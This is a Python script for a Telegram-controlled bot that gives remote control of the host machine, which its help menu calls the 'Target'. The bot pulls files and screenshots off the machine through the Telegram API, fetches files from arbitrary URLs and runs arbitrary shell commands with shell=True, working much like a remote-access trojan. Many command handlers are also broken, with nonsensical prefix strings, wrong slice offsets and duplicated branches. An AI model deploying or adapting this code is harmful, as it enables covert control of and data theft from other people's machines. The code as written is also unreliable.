#!/usr/bin/env python3
import os
import platform
import requests
import subprocess
import time
import importlib
import html
import json

# Define the Microsoft Teams webhook URL for notifications about unauthorized access attempts to the bot
teams_webhook_url = 'your_teams_webhook_url'

def import_module(module_name):
    try:
        importlib.import_module(module_name)
    except ImportError:
        install_command = f"python3 -m pip install {module_name} -q -q -q"
        subprocess.run(install_command, shell=True)

required_modules = ["PIL", "requests"]
for module_name in required_modules:
    import_module(module_name)

TOKEN = ''  # Store your bot token
AUTHORIZED_CHAT_IDS = ['964849068', 'AUTHORIZED_CHAT_ID2']
processed_message_ids = []
unauthorized_sent = False

# Define a log file for unauthorized access attempts
log_file = 'unauthorized_access.log'

def get_updates(offset=None):
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/getUpdates"
        params = {'offset': offset, 'timeout': 15}
        response = requests.get(url, params=params)
        response.raise_for_status()
        data = response.json()
        return data.get('result', [])
    except Exception as e:
        print(f"Failed to get updates: {str(e)}")
        return []

def delete_message(message_id, chat_id):
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/deleteMessage"
        params = {'chat_id': chat_id, 'message_id': message_id}
        response = requests.get(url, params=params)
        response.raise_for_status()
    except Exception as e:
        print(f"Failed to delete message: {str(e)}")

def is_authorized(chat_id):
    return chat_id in AUTHORIZED_CHAT_IDS

def handle_command(command, chat_id, username, first_name, last_name, mobile_number):
    if not is_authorized(chat_id):
        log_unauthorized_access(chat_id, username, first_name, last_name, mobile_number)  # Log unauthorized access attempt
        send_message(f"Unauthorized access. incident reported against username @{username}", chat_id)
        return

    if command == '/start':
        user_name = get_user_name(chat_id)
        welcome_message = f"Welcome, {user_name}! Your chat ID {chat_id} is successfully authorized."
        send_message(welcome_message, chat_id)

    # Handle other user's commands here...
    elif command == '/help':
        help_message = '''
        Aviable Commands: for microword tbot
        # command run without /

#download           | Download File From Target
/info               | Get System Info
/location           | Get Target Location
/geturl             | Download File From URL (provide direct link)
/pubip              | Get Public IP Address
/netstat            | Get Netstat
/pwd                | Get Current Path
/ifconfig           | Get Ifconfig
/routesprint        | Get Route Print
/screenshot         | Take Screenshot
/mem                | Get Memory Info
/disk               | Get Disk Info
/uptime             | Get Uptime
/upgrade            | Upgrade System
/dist_upgrade       | Dist Upgrade System
/exec               | Execute cmd commands directly in bot
/help               | Show Help Menu

            '''
        send_message(help_message, chat_id)

    elif command == '/info':
        info_message = f"OS: {platform.system()}\n" \
                       f"Release: {platform.release()}\n" \
                       f"Version: {platform.version()}\n" \
                       f"Machine: {platform.machine()}\n" \
                       f"Processor: {platform.processor()}"
        send_message(info_message, chat_id)

    elif command == '/pubip':
        ip = requests.get('http://ifconfig.me').text
        send_message(ip, chat_id)
    
    elif command == '/mem':
        mem = subprocess.check_output(['free', '-m']).decode('utf-8')
        send_message(mem, chat_id)

    elif command == '/disk':
        disk = subprocess.check_output(['df', '-h']).decode('utf-8')
        send_message(disk, chat_id)

    elif command == '/uptime':
        uptime = subprocess.check_output(['uptime']).decode('utf-8')
        send_message(uptime, chat_id)

    elif command == '/ifconfig':
        ifconfig = subprocess.check_output(['ifconfig']).decode('utf-8')
        send_message(ifconfig, chat_id)
    
    elif command == '/netstat':
        netstat = subprocess.check_output(['netstat', '-tulpn']).decode('utf-8')
        send_message(netstat, chat_id)

    elif command == '/upgrade':
        upgrade = subprocess.check_output(['apt-get', 'upgrade', '-y']).decode('utf-8')
        send_message(upgrade, chat_id)
    
    elif command == '/dist-upgrade':
        dist_upgrade = subprocess.check_output(['apt-get', 'dist-upgrade', '-y']).decode('utf-8')
        send_message(dist_upgrade, chat_id)

    elif command.startswith('ping '):
        command = command[6:].strip()
        ping = subprocess.check_output(['ping', '-c', '4', command]).decode('utf-8')
        send_message(ping, chat_id)

    elif command.startswith('nmap '):
        command = command[6:].strip()
        nmap = subprocess.check_output(['nmap', '-sV', '', command]).decode('utf-8')
        send_message(nmap, chat_id)
    
    elif command.startswith('apt-get install or apt install or apt '):
        command = command[11:].strip()
        aptinstall = subprocess.check_output(['apt', 'install', command, '-y']).decode('utf-8')
        send_message(aptinstall, chat_id)

    elif command.startswith('apt-get or apt remove or apt '):
        command = command[10:].strip()
        aptremove = subprocess.check_output(['apt', 'remove', command, '-y']).decode('utf-8')
        send_message(aptremove, chat_id)

    elif command.startswith('apt-get or apt purge or apt '):
        command = command[9:].strip()
        aptpurge = subprocess.check_output(['apt', 'purge', command, '-y']).decode('utf-8')
        send_message(aptpurge, chat_id)
    
    elif command.startswith('apt-get or apt autoremove or apt '):
        command = command[15:].strip()
        aptautoremove = subprocess.check_output(['apt', 'autoremove', command, '-y']).decode('utf-8')
        send_message(aptautoremove, chat_id)

    elif command.startswith('apt-get or apt update or apt '):
        command = command[13:].strip()
        aptupdate = subprocess.check_output(['apt', 'update', command, '-y']).decode('utf-8')
        send_message(aptupdate, chat_id)
    
    elif command.startswith('apt-get or apt upgrade or apt '):
        command = command[14:].strip()
        aptupgrade = subprocess.check_output(['apt', 'upgrade', command, '-y']).decode('utf-8')
        send_message(aptupgrade, chat_id)

    elif command.startswith('apt-get or apt dist-upgrade or apt '):
        command = command[19:].strip()
        aptdistupgrade = subprocess.check_output(['apt', 'dist-upgrade', command, '-y']).decode('utf-8')
        send_message(aptdistupgrade, chat_id)

    elif command.startswith('apt-get or apt full-upgrade or apt '):
        command = command[19:].strip()
        aptfullupgrade = subprocess.check_output(['apt', 'full-upgrade', command, '-y']).decode('utf-8')
        send_message(aptfullupgrade, chat_id)

    elif command.startswith('ls or dir or ls -l or dir -l or ls -a or dir -a or ls -la or dir -la or ls -al or dir -al or ls -lh or dir -lh or ls -lha or dir -lha or ls -lah or dir'):
        command = command[8:].strip()
        ls = subprocess.check_output(['ls', '-l', command]).decode('utf-8')
        send_message(ls, chat_id)

    elif command.startswith('cd '):
        command = command[3:].strip()
        cd = subprocess.check_output(['cd', command]).decode('utf-8')
        send_message(cd, chat_id)

    elif command.startswith('/screenshot '):
        command = command[12:].strip()
        try:
            from PIL import ImageGrab
            im = ImageGrab.grab()
            im.save(command)
            send_file(command)
            os.remove(command)
            return f"Screenshot saved as '{command}' and sent to Telegram."
        except Exception as e:
            return f"Failed to capture screenshot. Error: {str(e)}"

    elif command.startswith('trace '):
        command = command[7:].strip()
        trace = subprocess.check_output(['traceroute', command]).decode('utf-8')
        send_message(trace, chat_id)

    elif command == '/routesprint':
        printroute = subprocess.check_output(['ip', 'route']).decode('utf-8')
        send_message(printroute, chat_id)

    elif command.startswith('download '):
        filename = command[
                   9:].strip()
        if os.path.isfile(filename):
            send_file(filename)
            return f"File '{filename}' sent to Telegram."
        else:
            return f"File '{filename}' not found."
        
    elif command.startswith('get '):
        url = command[4:].strip()
        try:
            download = requests.get(url)
            if download.status_code == 200:
                file_name = url.split('/')[-1]
                with open(file_name, 'wb') as out_file:
                    out_file.write(download.content)
                return f"File downloaded and saved as '{file_name}'."
            else:
                return f"Failed to download file from URL: {url}. Status Code: {download.status_code}"
        except Exception as e:
            return f"Failed to download file from URL: {url}. Error: {str(e)}"
        
    elif command.startswith('cd '):
        foldername = command[3:].strip()
        try:
            os.chdir(foldername)
            return "Directory Changed To: " + os.getcwd()
        except FileNotFoundError:
            return f"Directory not found: {foldername}"
        except Exception as e:
            return f"Failed to change directory. Error: {str(e)}"
        
    elif command == '/pwd':
        return os.getcwd()
        
    elif command.startswith(' '):
        command = command[0:].strip()
        try:
            output = subprocess.check_output(command, shell=True).decode('utf-8')
            send_message(output, chat_id)
        except Exception as e:
            return f"Failed to execute command. Error: {str(e)}"
    
    else:
        unknown_message = "Unknown command"
        send_message(unknown_message, chat_id)

    # ... (Other command handling)
def send_file(filename):
    url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
    with open(filename, 'rb') as file:
        files = {'document': file}
        data = {'chat_id': chat_id}
        response = requests.post(url, data=data, files=files)
        if response.status_code != 200:
            print(f"Response: {response.text}")

def send_message(text, chat_id):
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        params = {'chat_id': chat_id, 'text': html.escape(text)}  # Sanitize user input to prevent XSS
        response = requests.get(url, params=params)
        response.raise_for_status()
    except Exception as e:
        print(f"Failed to send message: {str(e)}")

def get_user_name(chat_id):
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/getChat"
        params = {'chat_id': chat_id}
        response = requests.get(url, params=params)
        response.raise_for_status()
        data = response.json()
        return data['result']['first_name']
    except Exception as e:
        print(f"Failed to get user name: {str(e)}")
        return "User"

def log_unauthorized_access(chat_id, username, first_name, last_name, mobile_number):
    with open(log_file, 'a') as log:
        log.write("Unauthorized access attempt:\n")
        log.write(f"Chat ID: {chat_id}\n")
        log.write(f"Username: {username}\n")
        log.write(f"First Name: {first_name}\n")
        log.write(f"Last Name: {last_name}\n")
        log.write(f"Mobile Number: {mobile_number}\n")
        log.write(f"Timestamp: {time.strftime('%Y-%m-d %H:%M:%S')}\n\n")

# Send a notification to the Teams webhook
    # Send a notification to the Teams webhook
    teams_message = {
        "summary": "Unauthorized Access Attempt",
        "text": f"Unauthorized access attempt:\n"
                f"Chat ID: {chat_id}\n"
                f"Username: {username}\n"
                f"First Name: {first_name}\n"
                f"Last Name: {last_name}\n"
                f"Mobile Number: {mobile_number}\n"
                f"Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n"
    }
    teams_payload = json.dumps(teams_message)
    teams_headers = {'Content-Type': 'application/json'}
    
    response = requests.post(teams_webhook_url, data=teams_payload, headers=teams_headers)
    
    if response.status_code != 200:
        print(f"Failed to send notification to Teams. Status code: {response.status_code}")



# Load the latest processed update ID from a file
latest_update_id = 0  # Initialize the latest update ID

while True:
    updates = get_updates(offset=latest_update_id)
    if updates:
        for update in updates:
            if 'update_id' in update:
                latest_update_id = update['update_id'] + 1  # Update the latest update ID
            if 'message' in update and 'text' in update['message']:
                message_id = update['message']['message_id']
                chat_id = str(update['message']['chat']['id'])
                username = update['message']['from']['username'] if 'username' in update['message']['from'] else "N/A"
                first_name = update['message']['from']['first_name'] if 'first_name' in update['message']['from'] else "N/A"
                last_name = update['message']['from']['last_name'] if 'last_name' in update['message']['from'] else "N/A"
                mobile_number = update['message']['from'].get('phone_number', "N/A")
                if message_id not in processed_message_ids:
                    processed_message_ids.append(message_id)
                    handle_command(update['message']['text'], chat_id, username, first_name, last_name, mobile_number)
    time.sleep(1)

# Save the processed message IDs to a file
with open('processed_message_ids.txt', 'w') as file:
    for message_id in processed_message_ids:
        file.write(str(message_id) + '\n')
